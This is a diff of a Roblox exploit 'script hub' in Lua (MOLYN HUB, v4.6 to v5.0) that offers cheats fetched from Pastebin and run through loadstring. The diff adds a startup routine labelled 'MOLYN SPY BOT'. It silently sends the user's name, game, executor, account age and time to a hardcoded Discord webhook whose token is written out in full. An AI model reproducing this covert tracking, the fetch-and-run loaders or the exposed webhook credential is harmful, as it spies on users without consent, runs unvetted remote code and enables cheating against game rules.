@@ -1,8 +1,8 @@
 -- MOLYN SCRIPT HUB
 -- Company: MOLYN DEVELOPMENT
 -- Creator: MOHAMMED
--- Version: 4.6
--- Premium UI Script Hub with Player Control
+-- Version: 5.0
+-- Premium UI Script Hub
 
 local Players = game:GetService("Players")
 local TweenService = game:GetService("TweenService")
@@ -12,14 +12,13 @@ local CoreGui = game:GetService("CoreGui")
 local MarketplaceService = game:GetService("MarketplaceService")
 local RunService = game:GetService("RunService")
 local VoiceChatService = game:GetService("VoiceChatService")
-local TextChatService = game:GetService("TextChatService")
 
 local player = Players.LocalPlayer
 local playerGui = player:WaitForChild("PlayerGui")
 
 -- Discord Webhook Configuration
 local DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1388935051877683330/Oppqs6DDEHcndmNxEE7mkfe1LAlrjI5CaDdlHq2xs9iu39ohGlgHRVYL2CfEdD3TY-f_"
-local FEEDBACK_WEBHOOK_URL = DISCORD_WEBHOOK_URL -- Same webhook for feedback
+local FEEDBACK_WEBHOOK_URL = DISCORD_WEBHOOK_URL
 
 -- Security Configuration
 local BLACKLIST = {
@@ -32,12 +31,12 @@ local BLACKLIST = {
     ["lovebri395"] = "You are banned from using this script"
 }
 
--- Theme Colors (Black and Red Theme)
+-- Theme Colors
 local theme = {
-    primary = Color3.fromRGB(255, 50, 50),  -- Red
-    secondary = Color3.fromRGB(20, 20, 20),  -- Darker black
+    primary = Color3.fromRGB(255, 50, 50),
+    secondary = Color3.fromRGB(20, 20, 20),
     accent = Color3.fromRGB(255, 80, 80),
-    background = Color3.fromRGB(10, 10, 10), -- Very dark
+    background = Color3.fromRGB(10, 10, 10),
     surface = Color3.fromRGB(25, 25, 25),
     text = Color3.fromRGB(255, 255, 255),
     textSecondary = Color3.fromRGB(200, 200, 200),
@@ -45,12 +44,11 @@ local theme = {
     warning = Color3.fromRGB(255, 255, 50),
     error = Color3.fromRGB(255, 50, 50),
     closeButton = Color3.fromRGB(255, 50, 50),
-    logoBackground = Color3.fromRGB(0, 0, 0)  -- Black for logo background
+    logoBackground = Color3.fromRGB(0, 0, 0)
 }
 
--- Scripts Database (Updated with your requested scripts)
+-- Scripts Database
 local scriptsDatabase = {
-    -- Featured Scripts (Top of the list)
     {
         name = "MOLYN Spammer",
         description = "commands spammer script",
@@ -105,11 +103,9 @@ local scriptsDatabase = {
         ]],
         featured = false
     },
-    
-    -- Other Scripts
     {
         name = "vfly molyn",
-        description = "Fly with car or without",
+        description = "Fly with car or without (in maintenance)",
         category = "Movement",
         code = [[loadstring(game:HttpGet("https://pastebin.com/raw/99e5KqHX"))()]],
         featured = true
@@ -137,11 +133,9 @@ local scriptsDatabase = {
     },
     {
         name = "MOLYN UNIVERSAL",
-        description = "universal features like fly.noclip.etc ",
+        description = "universal features like fly.noclip.etc",
         category = "Visual",
-        code = [[
-            loadstring(game:HttpGet('https://pastebin.com/raw/wkUVCNj3'))()
-        ]],
+        code = [[loadstring(game:HttpGet('https://pastebin.com/raw/wkUVCNj3'))()]],
         featured = true
     }
 }
@@ -245,7 +239,6 @@ local function ActivateAntiSpam()
         end)
     end
     
-    -- Only show notification if files were deleted
     if deleted > 0 then
         CreateNotification("ANTI SPAM ACTIVATED", theme.primary, 5)
     end
@@ -253,10 +246,13 @@ end
 
 -- Send Discord Webhook
 local function SendWebhook(url, data)
-    if not http_request then return end
+    if not http_request then 
+        warn("HTTP request function not available")
+        return false
+    end
     
-    pcall(function()
-        http_request({
+    local success, response = pcall(function()
+        local response = http_request({
             Url = url,
             Method = "POST",
             Headers = {
@@ -264,88 +260,65 @@ local function SendWebhook(url, data)
             },
             Body = HttpService:JSONEncode(data)
         })
+        return response
     end)
+    
+    if not success then
+        warn("Failed to send webhook:", response)
+        return false
+    end
+    
+    return true
 end
 
--- Improved Admin Manager
-local function SetupAdminCommands()
-    _G.AdminCommands = {
-        kick = function(name)
-            local target = Players:FindFirstChild(name)
-            if target then
-                if target == player then
-                    CreateNotification("You can't kick yourself!", theme.error, 3)
-                    return
-                end
-                
-                -- Try different kick methods
-                pcall(function() target:Kick("Kicked by MOLYN HUB admin") end)
-                pcall(function() game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("/kick "..name, "All") end)
-                CreateNotification("Kicked: "..name, theme.success, 3)
-            else
-                CreateNotification("Player not found: "..name, theme.error, 3)
-            end
-        end,
-        
-        ban = function(name)
-            local target = Players:FindFirstChild(name)
-            if target then
-                if target == player then
-                    CreateNotification("You can't ban yourself!", theme.error, 3)
-                    return
-                end
-                
-                -- Try different ban methods
-                pcall(function() target:Kick("Banned by MOLYN HUB admin") end)
-                pcall(function() game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("/ban "..name, "All") end)
-                CreateNotification("Banned: "..name, theme.success, 3)
-            else
-                CreateNotification("Player not found: "..name, theme.error, 3)
-            end
-        end
+-- Get Account Age
+local function GetAccountAge()
+    local success, age = pcall(function()
+        return player.AccountAge
+    end)
+    return success and age or "Unknown"
+end
+
+-- Send Monitoring Data
+local function SendMonitoringData()
+    local executor = identifyexecutor() or "Unknown"
+    local gameName = MarketplaceService:GetProductInfo(game.PlaceId).Name
+    local accountAge = GetAccountAge()
+    
+    local data = {
+        ["content"] = "MOLYN HUB ACTIVATED",
+        ["username"] = "MOLYN SPY BOT",
+        ["avatar_url"] = "https://imgur.com/gallery/spy-bot-vytTqYx#mvMLTNn",
+        ["embeds"] = {{
+            ["title"] = "Player Monitoring Data",
+            ["description"] = "New script activation detected",
+            ["color"] = 14423100,
+            ["fields"] = {
+                {["name"] = "👤 Player", ["value"] = player.Name, ["inline"] = true},
+                {["name"] = "🎮 Game", ["value"] = gameName, ["inline"] = true},
+                {["name"] = "⚙️ Executor", ["value"] = executor, ["inline"] = true},
+                {["name"] = "📅 Account Age", ["value"] = accountAge.." days", ["inline"] = true},
+                {["name"] = "🕒 Time", ["value"] = os.date("%X - %d/%m/%Y"), ["inline"] = true}
+            }
+        }}
     }
     
-    -- Chat command handler
-    if TextChatService then
-        TextChatService.OnIncomingMessage = function(message)
-            local text = string.lower(message.Text)
-            local speaker = tostring(message.TextSource)
-            
-            if string.sub(text, 1, 6) == "/kick " then
-                local target = string.sub(text, 7)
-                _G.AdminCommands.kick(target)
-            elseif string.sub(text, 1, 5) == "/ban " then
-                local target = string.sub(text, 6)
-                _G.AdminCommands.ban(target)
-            end
-        end
-    else -- Fallback for older chat system
-        game:GetService("Players").LocalPlayer.Chatted:Connect(function(msg)
-            local text = string.lower(msg)
-            
-            if string.sub(text, 1, 6) == "/kick " then
-                local target = string.sub(text, 7)
-                _G.AdminCommands.kick(target)
-            elseif string.sub(text, 1, 5) == "/ban " then
-                local target = string.sub(text, 6)
-                _G.AdminCommands.ban(target)
-            end
-        end)
+    local success = SendWebhook(DISCORD_WEBHOOK_URL, data)
+    if not success then
+        CreateNotification("Failed to send monitoring data", theme.error, 5)
     end
 end
 
--- Create Main GUI with updated design
+-- Create Main GUI
 local function createGUI()
     local screenGui = Instance.new("ScreenGui")
     screenGui.Name = "MOLYN_HUB"
     screenGui.ResetOnSpawn = false
     screenGui.Parent = CoreGui
     
-    -- Add UIScale for responsiveness
     local uiScale = Instance.new("UIScale")
     uiScale.Parent = screenGui
     
-    -- Scale down for mobile devices
     if UserInputService.TouchEnabled then
         uiScale.Scale = 0.75
     end
@@ -358,15 +331,14 @@ local function createGUI()
     mainFrame.BorderSizePixel = 0
     mainFrame.Parent = screenGui
     
-    -- Corner
     local corner = Instance.new("UICorner")
     corner.CornerRadius = UDim.new(0, 12)
     corner.Parent = mainFrame
     
-    -- Header with black background
+    -- Header
     local header = Instance.new("Frame")
     header.Size = UDim2.new(1, 0, 0, 120)
-    header.BackgroundColor3 = theme.logoBackground -- Black background
+    header.BackgroundColor3 = theme.logoBackground
     header.BorderSizePixel = 0
     header.Parent = mainFrame
     
@@ -374,7 +346,7 @@ local function createGUI()
     headerCorner.CornerRadius = UDim.new(0, 12)
     headerCorner.Parent = header
 
-    -- Square Logo Container
+    -- Logo
     local logoContainer = Instance.new("Frame")
     logoContainer.Size = UDim2.new(0, 100, 0, 100)
     logoContainer.Position = UDim2.new(0.5, -50, 0.5, -50)
@@ -385,11 +357,10 @@ local function createGUI()
     logoCorner.CornerRadius = UDim.new(0, 12)
     logoCorner.Parent = logoContainer
 
-    -- Logo using Asset ID 109421193232034 (centered in square)
     local logo = Instance.new("ImageLabel")
-    logo.Image = "rbxassetid://109421193232034" -- Actual logo asset
-    logo.Size = UDim2.new(0, 90, 0, 90) -- Slightly smaller than container
-    logo.Position = UDim2.new(0.5, -45, 0.5, -45) -- Centered
+    logo.Image = "rbxassetid://109421193232034"
+    logo.Size = UDim2.new(0, 90, 0, 90)
+    logo.Position = UDim2.new(0.5, -45, 0.5, -45)
     logo.BackgroundTransparency = 1
     logo.Parent = logoContainer
 
@@ -406,7 +377,7 @@ local function createGUI()
 
     -- Subtitle
     local subtitle = Instance.new("TextLabel")
-    subtitle.Text = "Public SCRIPT HUB | v4.6"
+    subtitle.Text = "Public SCRIPT HUB | v5.0"
     subtitle.Size = UDim2.new(1, 0, 0, 20)
     subtitle.Position = UDim2.new(0, 0, 0, 160)
     subtitle.BackgroundTransparency = 1
@@ -452,7 +423,7 @@ local function createGUI()
     searchBox.TextColor3 = theme.text
     searchBox.Font = Enum.Font.Gotham
     searchBox.TextSize = 14
-    searchBox.Text = "" -- Clear initial text
+    searchBox.Text = ""
     searchBox.ClearTextOnFocus = false
     searchBox.Parent = mainFrame
     
@@ -461,7 +432,7 @@ local function createGUI()
     searchCorner.Parent = searchBox
     
     local searchIcon = Instance.new("ImageLabel")
-    searchIcon.Image = "rbxassetid://3926305904" -- Search icon
+    searchIcon.Image = "rbxassetid://3926305904"
     searchIcon.ImageRectOffset = Vector2.new(964, 324)
     searchIcon.ImageRectSize = Vector2.new(36, 36)
     searchIcon.Size = UDim2.new(0, 20, 0, 20)
@@ -482,7 +453,7 @@ local function createGUI()
     layout.Padding = UDim.new(0, 10)
     layout.Parent = scriptsFrame
 
-    -- Create Script Buttons with improved design
+    -- Create Script Buttons
     local function createScriptButton(scriptData)
         local btn = Instance.new("Frame")
         btn.Size = UDim2.new(1, 0, 0, 80)
@@ -494,7 +465,7 @@ local function createGUI()
         btnCorner.CornerRadius = UDim.new(0, 8)
         btnCorner.Parent = btn
 
-        -- Script Name with glow effect for featured scripts
+        -- Script Name
         local name = Instance.new("TextLabel")
         name.Text = scriptData.name
         name.Size = UDim2.new(0.7, 0, 0, 30)
@@ -518,7 +489,7 @@ local function createGUI()
         desc.TextXAlignment = Enum.TextXAlignment.Left
         desc.Parent = btn
 
-        -- Execute Button with hover effect
+        -- Execute Button
         local execBtn = Instance.new("TextButton")
         execBtn.Text = "EXECUTE"
         execBtn.Size = UDim2.new(0, 100, 0, 30)
@@ -532,7 +503,6 @@ local function createGUI()
         execCorner.CornerRadius = UDim.new(0, 6)
         execCorner.Parent = execBtn
 
-        -- Hover effect for execute button
         execBtn.MouseEnter:Connect(function()
             TweenService:Create(execBtn, TweenInfo.new(0.2), {BackgroundColor3 = theme.accent}):Play()
         end)
@@ -542,12 +512,10 @@ local function createGUI()
         end)
 
         execBtn.MouseButton1Click:Connect(function()
-            -- Visual feedback
             TweenService:Create(execBtn, TweenInfo.new(0.1), {Size = UDim2.new(0, 95, 0, 28)}):Play()
             wait(0.1)
             TweenService:Create(execBtn, TweenInfo.new(0.1), {Size = UDim2.new(0, 100, 0, 30)}):Play()
             
-            -- Execute script
             local success, err = pcall(function()
                 loadstring(scriptData.code)()
             end)
@@ -560,7 +528,7 @@ local function createGUI()
             end
         end)
 
-        -- Featured Badge with animation
+        -- Featured Badge
         if scriptData.featured then
             local badge = Instance.new("Frame")
             badge.Size = UDim2.new(0, 80, 0, 20)
@@ -581,7 +549,6 @@ local function createGUI()
             badgeText.TextSize = 10
             badgeText.Parent = badge
 
-            -- Pulsing animation
             spawn(function()
                 while badge.Parent do
                     TweenService:Create(badge, TweenInfo.new(1, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut, -1, true), {
@@ -593,7 +560,7 @@ local function createGUI()
         end
     end
 
-    -- Populate Scripts (featured first)
+    -- Populate Scripts
     local function sortScripts(a, b)
         if a.featured and not b.featured then return true end
         if not a.featured and b.featured then return false end
@@ -705,9 +672,13 @@ local function createGUI()
                 }}
             }
             
-            SendWebhook(FEEDBACK_WEBHOOK_URL, data)
-            CreateNotification("Feedback sent! Thank you!", theme.success, 3)
-            feedbackPopup:Destroy()
+            local success = SendWebhook(FEEDBACK_WEBHOOK_URL, data)
+            if success then
+                CreateNotification("Feedback sent! Thank you!", theme.success, 3)
+                feedbackPopup:Destroy()
+            else
+                CreateNotification("Failed to send feedback", theme.error, 3)
+            end
         end)
         
         -- Close popup
@@ -716,7 +687,7 @@ local function createGUI()
         end)
     end)
 
-    -- Close Button Function with animation
+    -- Close Button Function
     closeBtn.MouseButton1Click:Connect(function()
         TweenService:Create(mainFrame, TweenInfo.new(0.3, Enum.EasingStyle.Back, Enum.EasingDirection.In), {
             Size = UDim2.new(0, 0, 0, 0),
@@ -769,8 +740,8 @@ if not CheckSecurity() then return end
 -- Activate anti-spam system
 ActivateAntiSpam()
 
--- Setup admin commands
-SetupAdminCommands()
+-- Send monitoring data
+SendMonitoringData()
 
 -- Create initial notification
 CreateNotification("MOLYN HUB LOADED", theme.primary, 3)
@@ -779,3 +750,21 @@ CreateNotification("MOLYN HUB LOADED", theme.primary, 3)
 wait(1)
 local gui = createGUI()
 local guiVisible = true
+
+-- Key binding for toggling GUI
+UserInputService.InputBegan:Connect(function(input, gameProcessed)
+    if gameProcessed then return end
+    
+    if input.KeyCode == Enum.KeyCode.Insert then
+        if guiVisible and gui then
+            gui:Destroy()
+            gui = nil
+            guiVisible = false
+            CreateNotification("MOLYN Hub hidden", theme.textSecondary, 2)
+        else
+            gui = createGUI()
+            guiVisible = true
+            CreateNotification("MOLYN Hub opened", theme.primary, 2)
+        end
+    end
+end)
